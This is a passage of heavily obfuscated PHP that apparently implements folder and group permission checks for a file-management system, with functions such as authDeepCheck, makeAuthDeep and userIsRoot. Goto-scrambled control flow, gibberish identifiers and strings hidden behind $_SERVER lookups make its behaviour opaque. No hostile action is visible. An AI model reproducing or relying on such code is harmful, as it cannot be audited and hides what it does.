CôÙ¿¹ïØ§: } array_multisort($a¦Ê†Â‹Û½, SORT_DESC, $aÙÏíÇĞ); goto d³ƒ’èÏÓ¨; fßˆ‘ï»Ÿ™: } public function getAllChildrenByUser($cšØ¯öÖï†, $cêÜ—à‹ƒÒ) { goto f†ÙŞã¥š™; D­ÈÓôšŒ: if ($AÓ«‰²“‚š[$e£§Î…å¨[488]] == $e£§Î…å¨[495] && $AÓ«‰²“‚š[$e£§Î…å¨[483]] != $f“ğÙ‹†¡ˆ && $this->groupContainUser($AÓ«‰²“‚š[$e£§Î…å¨[483]], $cêÜ—à‹ƒÒ)) { foreach ($d”ŒÔó–[$e£§Î…å¨[1832]] as $D«ó¿—­½Ş) { $eÔ§ƒÙ¬Š´ = Model($e£§Î…å¨[485])->getInfo($D«ó¿—­½Ş[$e£§Î…å¨[1657]]); $eïÂ²İÍ§’ = Model($e£§Î…å¨[504])->getInfoSimpleOuter($cêÜ—à‹ƒÒ); $eïÂ²İÍ§’[$e£§Î…å¨[444]] = $D«ó¿—­½Ş[$e£§Î…å¨[403]]; if (Model($e£§Î…å¨[1825])->authCheckAction($D«ó¿—­½Ş[$e£§Î…å¨[403]][$e£§Î…å¨[403]], $e£§Î…å¨[1677])) { continue; } $F‹Ëé·©ÍĞ = array($e£§Î…å¨[28] => $e£§Î…å¨[1450] . $eÔ§ƒÙ¬Š´[$e£§Î…å¨[28]], $e£§Î…å¨[396] => $eÔ§ƒÙ¬Š´[$e£§Î…å¨[84]][$e£§Î…å¨[396]], $e£§Î…å¨[75] => KodIO::make($eÔ§ƒÙ¬Š´[$e£§Î…å¨[84]][$e£§Î…å¨[396]]), $e£§Î…å¨[488] => $e£§Î…å¨[495], $e£§Î…å¨[398] => $e£§Î…å¨[992], $e£§Î…å¨[29] => $e£§Î…å¨[515], $e£§Î…å¨[493] => $eÔ§ƒÙ¬Š´[$e£§Î…å¨[490]], $e£§Î…å¨[1657] => $eÔ§ƒÙ¬Š´[$e£§Î…å¨[1657]], $e£§Î…å¨[487] => $eÔ§ƒÙ¬Š´[$e£§Î…å¨[488]], $e£§Î…å¨[1829] => array($eïÂ²İÍ§’)); $E®åöâ¯‰[$F‹Ëé·©ÍĞ[$e£§Î…å¨[396]]] = $F‹Ëé·©ÍĞ; } } $aØ¶“ĞÉ× = array(); $B¹ á²¥Õ = $this->getAllChildren($cšØ¯öÖï†); goto CŒŠƒ¬ÔÒé; CêÃäÏİ˜×: $AÓ«‰²“‚š = Model($e£§Î…å¨[1178])->sourceInfo($cšØ¯öÖï†); $E®åöâ¯‰ = array(); $f“ğÙ‹†¡ˆ = 1; goto D­ÈÓôšŒ; CŒŠƒ¬ÔÒé: foreach ($B¹ á²¥Õ as $f¡ç§ù¬ Ù) { $cåÊç‰á¯Ù = !1; foreach ($f¡ç§ù¬ Ù[$e£§Î…å¨[1829]] as $f­®ÎŞƒ£É) { if ($f­®ÎŞƒ£É[$e£§Î…å¨[1498]]) { if ($f­®ÎŞƒ£É[$e£§Î…å¨[1498]] == $cêÜ—à‹ƒÒ) { $cåÊç‰á¯Ù = !0; break; } } if ($f­®ÎŞƒ£É[$e£§Î…å¨[1657]]) { if ($this->groupContainUser($f­®ÎŞƒ£É[$e£§Î…å¨[1657]], $cêÜ—à‹ƒÒ)) { $cåÊç‰á¯Ù = !0; break; } } } if ($cåÊç‰á¯Ù) { $aØ¶“ĞÉ×[] = $f¡ç§ù¬ Ù; } $Eß”ˆç¡öÄ = $f¡ç§ù¬ Ù[$e£§Î…å¨[396]]; if (isset($E®åöâ¯‰[$Eß”ˆç¡öÄ])) { $f¡ç§ù¬ Ù[$e£§Î…å¨[1829]][] = $E®åöâ¯‰[$Eß”ˆç¡öÄ][0]; $E®åöâ¯‰[$Eß”ˆç¡öÄ] = !1; } } $E®åöâ¯‰ = array_filter(array_values($E®åöâ¯‰)); $aØ¶“ĞÉ× = array_merge($E®åöâ¯‰, $aØ¶“ĞÉ×); goto Dö¼Ä¬½åÌ; f†ÙŞã¥š™: $e£§Î…å¨ =& $_SERVER[¢ÌÛ]; $d”ŒÔó– = Model($e£§Î…å¨[504])->getInfo($cêÜ—à‹ƒÒ); if (!$cêÜ—à‹ƒÒ || !$cšØ¯öÖï† || !$d”ŒÔó–) { return array(); } goto CêÃäÏİ˜×; Dö¼Ä¬½åÌ: return $aØ¶“ĞÉ×; goto fï„ÆÌéÖ; fï„ÆÌéÖ: } public function setAllChildrenByUser($eØÙ¤©ô»ù, $fæ¾¯Š›Õ¸, $Dç†»¤¾) { $BÔÜ´Šò =& $_SERVER[¢ÌÛ]; $dè×È¯Õ‡½ = $this->getAllChildrenByUser($eØÙ¤©ô»ù, $fæ¾¯Š›Õ¸); if (!$Dç†»¤¾ || !$dè×È¯Õ‡½) { return !1; } foreach ($dè×È¯Õ‡½ as $B™“ôˆ™‰) { $fŒ‚…îŠŠ = array(); foreach ($B™“ôˆ™‰[$BÔÜ´Šò[1829]] as $eƒâÄ¿ØÂÄ) { $AãªÎ˜íº¸ = $eƒâÄ¿ØÂÄ[$BÔÜ´Šò[444]]; $EĞÍ’¯°Õ = $eƒâÄ¿ØÂÄ[$BÔÜ´Šò[1498]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $D¼ğ¼±ÚáÔ = $eƒâÄ¿ØÂÄ[$BÔÜ´Šò[1498]] ? $eƒâÄ¿ØÂÄ[$BÔÜ´Šò[1498]] : $eƒâÄ¿ØÂÄ[$BÔÜ´Šò[1657]]; if ($eƒâÄ¿ØÂÄ[$BÔÜ´Šò[1498]] && $eƒâÄ¿ØÂÄ[$BÔÜ´Šò[1498]] == $fæ¾¯Š›Õ¸) { continue; } $fŒ‚…îŠŠ[] = array($BÔÜ´Šò[396] => $B™“ôˆ™‰[$BÔÜ´Šò[396]], $BÔÜ´Šò[398] => $EĞÍ’¯°Õ, $BÔÜ´Šò[483] => intval($D¼ğ¼±ÚáÔ), $BÔÜ´Šò[1806] => isset($AãªÎ˜íº¸[$BÔÜ´Šò[385]]) ? intval($AãªÎ˜íº¸[$BÔÜ´Šò[385]]) : 0, $BÔÜ´Šò[1807] => isset($AãªÎ˜íº¸[$BÔÜ´Šò[1807]]) ? intval($AãªÎ˜íº¸[$BÔÜ´Šò[1807]]) : -1); } $fŒ‚…îŠŠ[] = array($BÔÜ´Šò[396] => $B™“ôˆ™‰[$BÔÜ´Šò[396]], $BÔÜ´Šò[398] => SourceModel::TYPE_USER, $BÔÜ´Šò[483] => intval($fæ¾¯Š›Õ¸), $BÔÜ´Šò[1806] => intval($Dç†»¤¾), $BÔÜ´Šò[1807] => -1); $this->where(array($BÔÜ´Šò[410] => $B™“ôˆ™‰[$BÔÜ´Šò[396]]))->delete(); $this->addAll($fŒ‚…îŠŠ); } return !0; } public function get($cŒí¸ËæŠË) { $DŒÜ±Â†Á† = $this->getSourceList(array($cŒí¸ËæŠË), !0); return $DŒÜ±Â†Á†[0]; } public function getSourceList($BèäØƒèĞ, $D¥õ‰êš³ß = false, $cŒ§Œ®¿·£ = false) { goto f™½¨İ±µÌ; f™½¨İ±µÌ: $c³ŒÕÊç›Ê =& $_SERVER[¢ÌÛ]; if (!$BèäØƒèĞ) { return array(); } $b„×Ú„¯“Å = Model($c³ŒÕÊç›Ê[1178]); goto aİ×ªÈòÁÚ; B‹—¬Ï³ãĞ: $a÷â”²øË = array(); foreach ($D¥õ‰êš³ß as $A™ŒŞß£Ÿ½ => $F£Ûê¢¬Ñ÷) { if ($D£ÉÈ„á) { $a÷â”²øË[$A™ŒŞß£Ÿ½] = $a‡Ú‚±Û; continue; } $a÷â”²øË[$A™ŒŞß£Ÿ½] = $this->makeSourceAuth($F£Ûê¢¬Ñ÷, $b³¤Å–øĞ¨, $cŒ§Œ®¿·£); } return $a÷â”²øË; goto Cœß³èµ•Á; AˆéÈä‘†«: foreach ($D¥õ‰êš³ß as $cÍ–éñ³ÁÎ => $BØÆî”õ¡ø) { $dœ‚Í¨×íÙ = $b„×Ú„¯“Å->parentLevelArray($BØÆî”õ¡ø[$c³ŒÕÊç›Ê[486]]); $A¡´÷ôšØ§ = array_merge($A¡´÷ôšØ§, array($cÍ–éñ³ÁÎ), array_reverse($dœ‚Í¨×íÙ)); } $A¡´÷ôšØ§ = array_values(array_unique($A¡´÷ôšØ§)); if (!$A¡´÷ôšØ§) { return array(); } goto E¤éÇí›‹³; aİ×ªÈòÁÚ: if (!$D¥õ‰êš³ß && count($BèäØƒèĞ) == 1) { $D¥õ‰êš³ß = array(); $D¥õ‰êš³ß[$BèäØƒèĞ[0]] = $b„×Ú„¯“Å->sourceInfo($BèäØƒèĞ[0]); } if (!$D¥õ‰êš³ß) { $BßÎ£Ëó“ = array($c³ŒÕÊç›Ê[410] => array($c³ŒÕÊç›Ê[411], $BèäØƒèĞ)); $D¥õ‰êš³ß = $b„×Ú„¯“Å->field($c³ŒÕÊç›Ê[1833])->where($BßÎ£Ëó“)->select(); $D¥õ‰êš³ß = array_to_keyvalue($D¥õ‰êš³ß, $c³ŒÕÊç›Ê[396]); } $A¡´÷ôšØ§ = $BèäØƒèĞ; goto AˆéÈä‘†«; eá–Ş¦çá‡: $D£ÉÈ„á = $this->userIsRoot($cŒ§Œ®¿·£); $Aˆ¬í•Ï†é = AuthModel::authAll(); $a‡Ú‚±Û = array($c³ŒÕÊç›Ê[404] => $Aˆ¬í•Ï†é, $c³ŒÕÊç›Ê[1834] => array($c³ŒÕÊç›Ê[412] => 0, $c³ŒÕÊç›Ê[1663] => $Aˆ¬í•Ï†é, $c³ŒÕÊç›Ê[413] => LNG($c³ŒÕÊç›Ê[1835]), $c³ŒÕÊç›Ê[1678] => $c³ŒÕÊç›Ê[1836])); goto B‹—¬Ï³ãĞ; E¤éÇí›‹³: $Dùää­’µ® = $this->sourceAuthSelect($A¡´÷ôšØ§); $b³¤Å–øĞ¨ = array(); foreach ($A¡´÷ôšØ§ as $A™ŒŞß£Ÿ½) { if (isset($Dùää­’µ®[$A™ŒŞß£Ÿ½])) { $b³¤Å–øĞ¨[$A™ŒŞß£Ÿ½] = $Dùää­’µ®[$A™ŒŞß£Ÿ½]; } } goto eá–Ş¦çá‡; Cœß³èµ•Á: } public function authDeepCheck($e‹ÃÆ™·‰×, $bºÄæ‚…ø¬ = false) { goto bœƒ‚ÈÊùñ; A˜Ç‰ã„êÑ: if (!in_array($e‹ÃÆ™·‰×, $eÜ ¢—¸‘‰[$b“µàËâç‹[1837]])) { return !1; } $e»«öåƒ› = array(); foreach ($eÜ ¢—¸‘‰[$b“µàËâç‹[1838]] as $Bå¼š©õÑ => $fÄ™Ú¢¶Ü¹) { if (!in_array($e‹ÃÆ™·‰×, $fÄ™Ú¢¶Ü¹)) { continue; } $e»«öåƒ›[] = $Bå¼š©õÑ; } goto eš¯šß±ï›; bœƒ‚ÈÊùñ: $b“µàËâç‹ =& $_SERVER[¢ÌÛ]; $bºÄæ‚…ø¬ = $bºÄæ‚…ø¬ ? $bºÄæ‚…ø¬ : USER_ID; $eÜ ¢—¸‘‰ = $this->makeAuthDeep($bºÄæ‚…ø¬); goto A˜Ç‰ã„êÑ; eš¯šß±ï›: if (!$e»«öåƒ›) { return !1; } $b’¥òÆ·—Ş = $e»«öåƒ› ? $e»«öåƒ›[0] : $e‹ÃÆ™·‰×; return array($b“µàËâç‹[404] => -1, $b“µàËâç‹[444] => array($b“µàËâç‹[412] => $b“µàËâç‹[1061], $b“µàËâç‹[1663] => $b“µàËâç‹[495], $b“µàËâç‹[413] => LNG($b“µàËâç‹[1839]), $b“µàËâç‹[1678] => $b“µàËâç‹[1840]), $b“µàËâç‹[1841] => LNG($b“µàËâç‹[1842]), $b“µàËâç‹[1843] => $this->sourceAuthInfo($b’¥òÆ·—Ş)); goto b¨¡æ‹ÉÒÏ; b¨¡æ‹ÉÒÏ: } protected function makeAuthDeep($eöºã“ê‘ = false) { goto aŞ¤‡Ç‹ô; E‡Í…µË¶Ü: $aò½ùíÊï = array(); if ($BÉ“ª‰íÂó) { $eñ—¢¿¯•Ÿ = $f˜İÜ»è¡->where(array($E¯¢¼¾—ìÖ[396] => array($E¯¢¼¾—ìÖ[411], $BÉ“ª‰íÂó)))->select(); foreach ($eñ—¢¿¯•Ÿ as $F˜í¥ÁßÙ«) { $a¾¡Ğøƒ· = $f˜İÜ»è¡->parentLevelArray($F˜í¥ÁßÙ«[$E¯¢¼¾—ìÖ[486]]); $A¡½ÒéæÊÄ = array_merge($A¡½ÒéæÊÄ, $a¾¡Ğøƒ·); $Aß´ª‡‹Ù[] = $F˜í¥ÁßÙ«[$E¯¢¼¾—ìÖ[483]]; $CÇùÕŒƒã[$F˜í¥ÁßÙ«[$E¯¢¼¾—ìÖ[396]]] = $a¾¡Ğøƒ·; $B†…ŞÄß‚[$F˜í¥ÁßÙ«[$E¯¢¼¾—ìÖ[396]]] = $F˜í¥ÁßÙ«[$E¯¢¼¾—ìÖ[483]]; } } $Aß´ª‡‹Ù = array_values(array_unique($Aß´ª‡‹Ù)); goto Cİ×¹»ê÷ó; CêÕ¬·õ©ø: $Aß´ª‡‹Ù = $BÇÍ‡é¡¿; $f˜İÜ»è¡ = Model($E¯¢¼¾—ìÖ[1178]); $FƒÆå—¤æ = Model($E¯¢¼¾—ìÖ[485]); goto e®ÌÈßƒøù; bãñ‚ÒÁÌÃ: if ($BÇÍ‡é¡¿) { $dÖŞ‹µ»á = array(array($E¯¢¼¾—ìÖ[398] => SourceModel::TYPE_USER, $E¯¢¼¾—ìÖ[483] => $eöºã“ê‘), array($E¯¢¼¾—ìÖ[398] => SourceModel::TYPE_GROUP, $E¯¢¼¾—ìÖ[483] => array($E¯¢¼¾—ìÖ[411], $BÇÍ‡é¡¿)), $E¯¢¼¾—ìÖ[934] => $E¯¢¼¾—ìÖ[1746]); } $b½Æç‹ÒÊŞ = $this->field($E¯¢¼¾—ìÖ[1845])->where($dÖŞ‹µ»á)->select(); $BÉ“ª‰íÂó = array(); goto C³ùÕŠÂ³˜; aø»§ùÀ÷: if (isset($EÈ¬Õ·š®à[$eöºã“ê‘])) { return $EÈ¬Õ·š®à[$eöºã“ê‘]; } $Cçç©åª–î = Model($E¯¢¼¾—ìÖ[1844])->listData(); $c‰Ó‹¶Ä = array(); goto e°ÃğÄòÀ; Cİ×¹»ê÷ó: $cø´â÷ÂÅò = $Aß´ª‡‹Ù; foreach ($cø´â÷ÂÅò as $bñ´ĞØ ») { $cÛŒ®»Şáê = $FƒÆå—¤æ->getInfo($bñ´ĞØ »); $a¾¡Ğøƒ· = $f˜İÜ»è¡->parentLevelArray($cÛŒ®»Şáê[$E¯¢¼¾—ìÖ[486]]); $Aß´ª‡‹Ù = array_merge($Aß´ª‡‹Ù, $a¾¡Ğøƒ·); } $Aß´ª‡‹Ù = array_values(array_unique($Aß´ª‡‹Ù)); goto c¨ë„·„ªô; C³ùÕŠÂ³˜: $e™Û‡ã„å = array_to_keyvalue_group($b½Æç‹ÒÊŞ, $E¯¢¼¾—ìÖ[396]); foreach ($e™Û‡ã„å as $AÚ¦ã¿Ïš => $BŠğ÷«Â±ª) { $eÀÊ–æµè  = $this->authArrayCheck($BŠğ÷«Â±ª, $eöºã“ê‘); if ($eÀÊ–æµè [$E¯¢¼¾—ìÖ[404]] > 0) { $BÉ“ª‰íÂó[] = $AÚ¦ã¿Ïš . $E¯¢¼¾—ìÖ[33]; } } $A¡½ÒéæÊÄ = array(); goto CêÕ¬·õ©ø; e°ÃğÄòÀ: foreach ($Cçç©åª–î as $bˆà¥™Õ‡’) { if ($bˆà¥™Õ‡’[$E¯¢¼¾—ìÖ[403]] == 0 && $bˆà¥™Õ‡’[$E¯¢¼¾—ìÖ[1679]] == $E¯¢¼¾—ìÖ[86]) { $c‰Ó‹¶Ä[] = $bˆà¥™Õ‡’[$E¯¢¼¾—ìÖ[385]]; } } $BÇÍ‡é¡¿ = $this->userGroupParents($eöºã“ê‘); $dÖŞ‹µ»á = array($E¯¢¼¾—ìÖ[398] => SourceModel::TYPE_USER, $E¯¢¼¾—ìÖ[483] => $eöºã“ê‘); goto bãñ‚ÒÁÌÃ; e®ÌÈßƒøù: $CÇùÕŒƒã = array(); $B†…ŞÄß‚ = array(); $E‹±ò®É = array(); goto E‡Í…µË¶Ü; c¨ë„·„ªô: foreach ($Aß´ª‡‹Ù as $bñ´ĞØ ») { $cÛŒ®»Şáê = $FƒÆå—¤æ->getInfo($bñ´ĞØ »); $A¡½ÒéæÊÄ[] = $cÛŒ®»Şáê[$E¯¢¼¾—ìÖ[84]][$E¯¢¼¾—ìÖ[396]]; $E‹±ò®É[$bñ´ĞØ »] = $cÛŒ®»Şáê[$E¯¢¼¾—ìÖ[84]][$E¯¢¼¾—ìÖ[396]]; $aò½ùíÊï[$bñ´ĞØ »] = $f˜İÜ»è¡->parentLevelArray($cÛŒ®»Şáê[$E¯¢¼¾—ìÖ[486]]); } foreach ($CÇùÕŒƒã as $cÅˆµÓ¤è… => $C¬ÏâÌÜ×š) { $A‚ˆÕ•ùÁ = $B†…ŞÄß‚[$cÅˆµÓ¤è…]; if (!$A‚ˆÕ•ùÁ || !$E‹±ò®É[$A‚ˆÕ•ùÁ]) { continue; } $câßìˆ¼Ò = array(); foreach ($aò½ùíÊï[$A‚ˆÕ•ùÁ] as $bñ´ĞØ ») { $câßìˆ¼Ò[] = $E‹±ò®É[$bñ´ĞØ »]; } $CÇùÕŒƒã[$cÅˆµÓ¤è…] = array_merge($câßìˆ¼Ò, $C¬ÏâÌÜ×š); } $A¡½ÒéæÊÄ = array_values(array_unique($A¡½ÒéæÊÄ)); goto dˆ­¢ÑÄÒ; dˆ­¢ÑÄÒ: $a¦ÊÈƒÑ—› = array($E¯¢¼¾—ìÖ[1837] => $A¡½ÒéæÊÄ, $E¯¢¼¾—ìÖ[1838] => $CÇùÕŒƒã); $EÈ¬Õ·š®à[$eöºã“ê‘] = $a¦ÊÈƒÑ—›; return $a¦ÊÈƒÑ—›; goto dÏÌ‚µÅùÊ; aŞ¤‡Ç‹ô: $E¯¢¼¾—ìÖ =& $_SERVER[¢ÌÛ]; static $EÈ¬Õ·š®à = array(); $eöºã“ê‘ = $eöºã“ê‘ ? $eöºã“ê‘ : USER_ID; goto aø»§ùÀ÷; dÏÌ‚µÅùÊ: } private function makeSourceAuth($cã·÷ŞŒ”¯, $aäöâ§‹æ, $fóÈ¤‘›Õ = false) { goto aŸæ¹Ì˜Î¼; Dë×‡ìæŠ: $F›‚ñ‚©ù¯ = $cã·÷ŞŒ”¯[$F’‘ô’ºóß[398]] == SourceModel::TYPE_GROUP; $cÀµâöãä¬ = $F›‚ñ‚©ù¯ ? $this->groupRootAuth($Aâõ†Ï­«à, $fóÈ¤‘›Õ) : !1; if ($cÀµâöãä¬ && Model($F’‘ô’ºóß[1825])->authCheckAction($cÀµâöãä¬[$F’‘ô’ºóß[403]], $F’‘ô’ºóß[1677])) { return $this->groupAuthInfo($cÀµâöãä¬, $Aâõ†Ï­«à); } goto fÈ„Ô¿­†; A½í·óß¦¡: foreach ($b³ÕÉŠÎ‹‘ as $FÍ‘›·Ğ) { if (!isset($aäöâ§‹æ[$FÍ‘›·Ğ])) { continue; } $E•Åøà—¦« = $this->authMake($aäöâ§‹æ[$FÍ‘›·Ğ], $fóÈ¤‘›Õ); if ($E•Åøà—¦«[$F’‘ô’ºóß[444]]) { $B‡Õ´¦º°ó = $E•Åøà—¦«; break; } } if (!$F›‚ñ‚©ù¯) { return $B‡Õ´¦º°ó; } if (!$B‡Õ´¦º°ó && $cÀµâöãä¬) { $B‡Õ´¦º°ó = $this->groupAuthInfo($cÀµâöãä¬, $Aâõ†Ï­«à); } goto AˆÍí‰ñ‡; aŸæ¹Ì˜Î¼: $F’‘ô’ºóß =& $_SERVER[¢ÌÛ]; $FÔ·ïô†¨ä = $F’‘ô’ºóß[86]; $Aâõ†Ï­«à = $cã·÷ŞŒ”¯[$F’‘ô’ºóß[483]]; goto Dë×‡ìæŠ; AˆÍí‰ñ‡: if (!$B‡Õ´¦º°ó) { $d—˜¹á‰Ğß = Model($F’‘ô’ºóß[485])->getInfo($Aâõ†Ï­«à); $fŠ¶…¿Â¯ = explode($F’‘ô’ºóß[47], trim($d—˜¹á‰Ğß[$F’‘ô’ºóß[486]], $F’‘ô’ºóß[47])); $fŠ¶…¿Â¯ = array_reverse($fŠ¶…¿Â¯); foreach ($fŠ¶…¿Â¯ as $aÃ±¤ßƒ„å) { if ($aÃ±¤ßƒ„å == $F’‘ô’ºóß[495] || $aÃ±¤ßƒ„å == $FÔ·ïô†¨ä) { continue; } $Aœ£ò»İö„ = $this->groupRootAuth($aÃ±¤ßƒ„å, $fóÈ¤‘›Õ); if (!$Aœ£ò»İö„) { continue; } $B‡Õ´¦º°ó = $this->groupAuthInfo($Aœ£ò»İö„, $aÃ±¤ßƒ„å); break; } } if (!$B‡Õ´¦º°ó || $B‡Õ´¦º°ó[$F’‘ô’ºóß[404]] <= 0) { $dìîà ÆÖÌ = $this->authDeepCheck($cã·÷ŞŒ”¯[$F’‘ô’ºóß[396]], $fóÈ¤‘›Õ); if ($dìîà ÆÖÌ) { $B‡Õ´¦º°ó = $dìîà ÆÖÌ; } } return $B‡Õ´¦º°ó; goto cšğ³‰ŞºŸ; fÈ„Ô¿­†: $b³ÕÉŠÎ‹‘ = Model($F’‘ô’ºóß[1178])->parentLevelArray($cã·÷ŞŒ”¯[$F’‘ô’ºóß[486]]); $b³ÕÉŠÎ‹‘ = array_merge(array($cã·÷ŞŒ”¯[$F’‘ô’ºóß[396]]), array_reverse($b³ÕÉŠÎ‹‘)); $B‡Õ´¦º°ó = !1; goto A½í·óß¦¡; cšğ³‰ŞºŸ: } private function userIsRoot($d¾Øèµ¿˜¨ = false) { $BÏ·‰ÇÍ‹¬ =& $_SERVER[¢ÌÛ]; if (!$d¾Øèµ¿˜¨ && _get($GLOBALS, $BÏ·‰ÇÍ‹¬[484])) { return !0; } $A¶˜¥ö¸¯ = Model($BÏ·‰ÇÍ‹¬[504])->getInfo($d¾Øèµ¿˜¨); $c¤¶‰ñ—Ì» = Model($BÏ·‰ÇÍ‹¬[1846])->listData($A¶˜¥ö¸¯[$BÏ·‰ÇÍ‹¬[1382]]); if ($c¤¶‰ñ—Ì» && $c¤¶‰ñ—Ì»[$BÏ·‰ÇÍ‹¬[1254]][$BÏ·‰ÇÍ‹¬[1847]] == 1) { return !0; } return !1; } private function sourceAuthInfo($A©®¦óÙĞĞ) { goto dŞÂ‘ëï‰½; dŞÂ‘ëï‰½: $aÈÈöÓ¨§ =& $_SERVER[¢ÌÛ]; $dšà„­Ñ¸¼ = Model($aÈÈöÓ¨§[1178]); $eÇÔµ‘Ãƒ = $dšà„­Ñ¸¼->sourceInfo($A©®¦óÙĞĞ); goto eìƒŠä”’â; eìƒŠä”’â: if (!$eÇÔµ‘Ãƒ) { return !1; } $dšà„­Ñ¸¼->groupPathDisplay($eÇÔµ‘Ãƒ); $E‡ò®Ë™Ú‡ = array($eÇÔµ‘Ãƒ); goto a•ÛÇÚ¡»÷; a•ÛÇÚ¡»÷: $E‡ò®Ë™Ú‡ = $dšà„­Ñ¸¼->_listAppendPath($E‡ò®Ë™Ú‡); $eÇÔµ‘Ãƒ = $E‡ò®Ë™Ú‡[0]; $Cº®Ó­”¤ = $eÇÔµ‘Ãƒ[$aÈÈöÓ¨§[493]]; goto f¯†Î‹²†Ì; f¯†Î‹²†Ì: if (isset($eÇÔµ‘Ãƒ[$aÈÈöÓ¨§[491]])) { $Bñ¦ŠêÒğ = explode($aÈÈöÓ¨§[8], trim($eÇÔµ‘Ãƒ[$aÈÈöÓ¨§[493]], $aÈÈöÓ¨§[8])); array_shift($Bñ¦ŠêÒğ); $Cº®Ó­”¤ = $eÇÔµ‘Ãƒ[$aÈÈöÓ¨§[489]] . $aÈÈöÓ¨§[1848] . implode($aÈÈöÓ¨§[8], $Bñ¦ŠêÒğ); } return array($aÈÈöÓ¨§[413] => $eÇÔµ‘Ãƒ[$aÈÈöÓ¨§[28]], $aÈÈöÓ¨§[75] => KodIO::make($eÇÔµ‘Ãƒ[$aÈÈöÓ¨§[396]]), $aÈÈöÓ¨§[1849] => $Cº®Ó­”¤); goto fÜ¨ê·¾éÂ; fÜ¨ê·¾éÂ: } private function groupAuthInfo($bîßãÖ“³ó, $añë’İŠ ) { $Bì—£ô§”ó =& $_SERVER[¢ÌÛ]; $fÑ÷èØ‡ˆñ = Model($Bì—£ô§”ó[485])->getInfo($añë’İŠ ); return array($Bì—£ô§”ó[1850] => intval($bîßãÖ“³ó[$Bì—£ô§”ó[403]]), $Bì—£ô§”ó[1834] => $bîßãÖ“³ó, $Bì—£ô§”ó[1851] => LNG($Bì—£ô§”ó[1852]), $Bì—£ô§”ó[1843] => array($Bì—£ô§”ó[413] => $fÑ÷èØ‡ˆñ[$Bì—£ô§”ó[28]], $Bì—£ô§”ó[75] => KodIO::make($fÑ÷èØ‡ˆñ[$Bì—£ô§”ó[84]][$Bì—£ô§”ó[396]]), $Bì—£ô§”ó[1849] => $fÑ÷èØ‡ˆñ[$Bì—£ô§”ó[490]])); } protected function groupRootAuth($fµˆÓÙÈ½, $Bã¨±Ó°ë¬ = false) { goto f´÷ÜÆ˜ô; DåØò•ˆí¯: static $cˆÒ’–İĞù = array(); if (isset($cˆÒ’–İĞù[$BµøÇÀ¯é])) { return $cˆÒ’–İĞù[$BµøÇÀ¯é]; } $C¢´‰òÕë¨ = Model($dæÙÉ“‡†[485])->getInfo($fµˆÓÙÈ½); goto d„¹ÇÑ¹¾§; a¿ƒ÷ÑãÕ: $cˆÒ’–İĞù[$BµøÇÀ¯é] = $e¦öÏ³…‹ ? $e¦öÏ³…‹ : $aŸİªÓç; return $cˆÒ’–İĞù[$BµøÇÀ¯é]; goto cÛÉÑŞ×®É; d„¹ÇÑ¹¾§: $EµÌ¥ˆÓ÷£ = $this->userGroupList($Bã¨±Ó°ë¬); $aŸİªÓç = isset($EµÌ¥ˆÓ÷£[$fµˆÓÙÈ½]) ? $EµÌ¥ˆÓ÷£[$fµˆÓÙÈ½][$dæÙÉ“‡†[403]] : !1; if ($aŸİªÓç && Model($dæÙÉ“‡†[1825])->authCheckAction($aŸİªÓç[$dæÙÉ“‡†[403]], $dæÙÉ“‡†[1677])) { $cˆÒ’–İĞù[$BµøÇÀ¯é] = $aŸİªÓç; return $aŸİªÓç; } goto B¥ÄùÏ ‡‰; f´÷ÜÆ˜ô: $dæÙÉ“‡† =& $_SERVER[¢ÌÛ]; $Bã¨±Ó°ë¬ = $Bã¨±Ó°ë¬ ? $Bã¨±Ó°ë¬ : USER_ID; $BµøÇÀ¯é = $Bã¨±Ó°ë¬ . $dæÙÉ“‡†[1853] . $fµˆÓÙÈ½; goto DåØò•ˆí¯; B¥ÄùÏ ‡‰: $fŠŞË‘¦” = $this->sourceAuthSelect($C¢´‰òÕë¨[$dæÙÉ“‡†[84]][$dæÙÉ“‡†[396]]); $Dâ·¤¦¡áÕ = $fŠŞË‘¦” ? $this->authMake($fŠŞË‘¦”, $Bã¨±Ó°ë¬) : !1; $e¦öÏ³…‹ = $Dâ·¤¦¡áÕ ? $Dâ·¤¦¡áÕ[$dæÙÉ“‡†[444]] : !1; goto a¿ƒ÷ÑãÕ; cÛÉÑŞ×®É: } public function authOwnerApply($eÚí¶¹‡á) { goto C‰²‡ İË; D¬›ŒØùÑ: $F§ÚŒçÒÂ¬ = Model($E’‰´ÏÆäÑ[1178])->parentLevelArray($eÚí¶¹‡á[$E’‰´ÏÆäÑ[486]]); $F§ÚŒçÒÂ¬ = array_merge(array($eÚí¶¹‡á[$E’‰´ÏÆäÑ[396]]), array_reverse($F§ÚŒçÒÂ¬)); $e»¿Ò™†¡§ = $this->sourceAuthSelect($F§ÚŒçÒÂ¬); goto BöòÙ×÷É£; BöòÙ×÷É£: $A¹ƒ„õÙ„ = array(); $d³Óƒ™Ù = array(); foreach ($e»¿Ò™†¡§ as $B“¨ŞÈçÔî => $Fõ­×À‰) { $a—‘ºâ¢„Î = $this->authFolderOwnerUser($Fõ­×À‰); $A¹ƒ„õÙ„[$B“¨ŞÈçÔî] = $a—‘ºâ¢„Î; $d³Óƒ™Ù = array_merge($d³Óƒ™Ù, $a—‘ºâ¢„Î[$E’‰´ÏÆäÑ[560]]); if ($a—‘ºâ¢„Î[$E’‰´ÏÆäÑ[1855]]) { break; } } goto eÅ–Û³Ù¤; eÅ–Û³Ù¤: if (count($d³Óƒ™Ù) == 0) { $d³Óƒ™Ù = $this->authFolderOwnerGroup($eÚí¶¹‡á[$E’‰´ÏÆäÑ[483]]); } $d³Óƒ™Ù = array_unique($d³Óƒ™Ù); if (AuthModel::authCheckRoot($eÚí¶¹‡á[$E’‰´ÏÆäÑ[403]][$E’‰´ÏÆäÑ[404]])) { $d³Óƒ™Ù[] = USER_ID; } goto bĞãÅ‡†×º; C‰²‡ İË: $E’‰´ÏÆäÑ =& $_SERVER[¢ÌÛ]; if (empty($eÚí¶¹‡á[$E’‰´ÏÆäÑ[403]]) || isset($eÚí¶¹‡á[$E’‰´ÏÆäÑ[1854]]) && $eÚí¶¹‡á[$E’‰´ÏÆäÑ[1854]]) { return $eÚí¶¹‡á; } if (AuthModel::authCheckRoot($eÚí¶¹‡á[$E’‰´ÏÆäÑ[403]][$E’‰´ÏÆäÑ[404]])) { return $eÚí¶¹‡á; } goto D¬›ŒØùÑ; bĞãÅ‡†×º: $eÚí¶¹‡á[$E’‰´ÏÆäÑ[403]][$E’‰´ÏÆäÑ[1856]] = Model($E’‰´ÏÆäÑ[501])->userListInfo($d³Óƒ™Ù); return $eÚí¶¹‡á; goto Eğİ¬²ÕãÉ; 